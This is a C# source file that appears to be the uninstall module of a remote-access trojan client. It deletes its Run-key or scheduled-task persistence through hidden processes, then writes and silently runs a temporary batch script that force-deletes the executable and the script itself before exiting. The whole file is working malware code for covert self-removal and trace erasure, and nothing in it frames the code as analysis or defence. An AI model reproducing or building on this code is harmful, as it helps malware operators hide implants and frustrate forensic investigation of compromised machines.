using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace Plugin.Handler
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Plugin.Install))
            {
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Plugin.InstallFile);
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = "/delete /f /tn " + @"""'" + Plugin.InstallFile + @"""'",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                }
                catch { }
            }

            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 3 > NUL");
                sw.WriteLine("CD " + Application.StartupPath);
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }
            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Methods.ClientExit();
            Environment.Exit(0);

        }
    }

}
